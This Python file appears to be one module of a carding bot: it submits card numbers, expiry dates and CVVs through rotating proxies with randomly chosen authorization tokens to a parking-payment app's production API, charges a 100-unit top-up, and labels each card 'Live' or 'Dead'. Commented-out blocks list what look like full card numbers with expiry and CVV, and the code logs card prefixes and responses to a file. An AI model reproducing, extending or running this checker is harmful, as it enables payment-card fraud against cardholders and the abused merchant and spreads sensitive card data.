import sys, os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import json,cloudscraper
from datetime import datetime
from comandos.clasecmando import *
import random, time

Processor = CardProcessor()
Manager = DatabaseManager()

def leer_linea_aleatoria():
    archivo = "data/txt/token1.txt"  # Aquí defines el archivo dentro de la función
    with open(archivo, "r", encoding="utf-8") as f:
        lineas = f.readlines()
    return random.choice(lineas).strip() if lineas else None  # Evita error si el archivo está vacío


def coca(card):
    intentos = 0
    max_intentos = 3
    while intentos < max_intentos:
        try:       
            resultado = Processor.procesar_y_validar(card)    
            if resultado is None:
                return f"card -» {card}\nStatus -» Fechas Invalidas \nResult -» Fechas Invalidas\n"
            else:
                cc_number, mes, ano, cvv = resultado      

            seccion = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True}, delay=2)
            proxy_url = os.getenv("IPROYAL_ROTATORY_URL") or os.getenv("PROXY_ROTATORY")
            if not proxy_url:
                raise RuntimeError("No hay proxy configurado en .env (IPROYAL_ROTATORY_URL / PROXY_ROTATORY). Se bloquea request directa.")
            seccion.proxies = {"http": proxy_url, "https": proxy_url}
            inicio=datetime.now()  

            token = leer_linea_aleatoria()

            response = seccion.post(
                url = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas",
                data = f'{{"numero":"{cc_number}","expiracionMes":"{mes}","expiracionYear":"20{ano}"}}',
                headers = {
                    "user-agent": "Dart/2.18 (dart:io)",
                    "content-type": "application/json; charset=utf-8",
                    "accept-encoding": "gzip",
                    "authorization": token,
                    "host": "parkingpay-api-prod.azurewebsites.net"
            })

            time.sleep(5)

            if 'This web app is stopped' in response.text or response.status_code == 403:
                mantenimiento["cc"] = False
                guardar_mantenimiento(mantenimiento)
                print("[AUTO] Gate COCA (cc) desactivada - Web app detenida (403)")
                return f"card -» {card}\nStatus -» ⚠️ Error \nResult -» Gate Coca apagada (web app detenida). Se reactiva a las 8 AM.\n"

            if response.status_code == 400 or 'Ocurrió un error al crear la tarjeta en stripe' in response.text:   
                with open("gates/Coca Datos.txt", 'a',encoding='utf-8') as archivo:
                        archivo.write(cc_number[:6]+'---'+response.text+'\n')  
                tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
                status, result = "❌ Dead", f"Dead"
                message_to_send = f"Card: {card}\nStatus: {status}\nResult: {result}\n{tiempo} segundos!\n"
                return message_to_send  
            
            stripe_card_id = json.loads(response.text)["stripeCardId"]

            time.sleep(3)


            response = seccion.get(
            url = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor",

            headers = {
                "user-agent": "Dart/2.18 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": token,
                "host": "parkingpay-api-prod.azurewebsites.net"
            })
            
            tarjeta_id = None
            for tarjeta in json.loads(response.text).get("cartera", {}).get("tarjetas", []):
                if tarjeta.get("stripeInfo", {}).get("stripeCardId") == stripe_card_id:
                    tarjeta_id = tarjeta["tarjetaId"]
                    break
            if not tarjeta_id:
                return f"card -» {card}\nStatus -» ⚠️ Error\nResult -» Tarjeta no listada\n"

            time.sleep(5)

            if tarjeta_id:
                    response = seccion.post(
                    url = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/pagos/abono",
                    data = f'{{"tarjetaId":"{tarjeta_id}","porAbonar":100.0}}',
                    headers = {
                        "user-agent": "Dart/2.18 (dart:io)",
                        "content-type": "application/json; charset=utf-8",
                        "accept-encoding": "gzip",
                        "authorization": token,
                        "host": "parkingpay-api-prod.azurewebsites.net"
                    })

                    print("ABONO", response.status_code, response.text)

                    tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
                    with open("gates/Coca Datos.txt", 'a',encoding='utf-8') as archivo:
                        archivo.write(cc_number[:6]+'---'+response.text+'\n')  

                    if 'stripeCardId' in response.text or response.status_code == 200:
                        status, result = "✅ Live", "Changer 100 Mnx"
                    
                    elif 'No se pudo generar el abono con el proveedor' in response.text:         
                        status, result = "❌ Dead", f"Dead"

                    else:
                        status, result = "⚠️ Error", "Avisar Al Admin "
                        
                    message_to_send = f"Card: {card}\nStatus: {status}\nResult: {result}\n{tiempo} segundos!\n"
                    return message_to_send    
    
        except Exception as e:
                    print("coca Error:",e)
                    intentos += 1                    
                    if intentos >= max_intentos:
                        message_to_send = f"card -» {card}\nStatus -» ⚠️ Error \nResult -» Avisar al Admin\n"
                        return message_to_send


#print(coca('5470466021237790|12|27|292'))

#print(coca('5253030022704290|06|25|102'))

# cards='''4403931243021251|12|25|375
# 4403931221839690|05|26|931
# 4574310201127801|04|29|074
# 4190023005577527|01|29|578
# 4190024003126929|05|27|747
# 4400668200034611|03|25|035
# 4400667566027805|03|26|445
# 4400660077813029|06|28|543
# 4400668987356245|11|26|656
# 4400660841044109|07|26|984
# 4400662902488670|04|28|176'''

# card_lines = cards.split('\n') 
# for card in card_lines:
#     message_to_send = salsaverde(card)  
#     print(message_to_send)






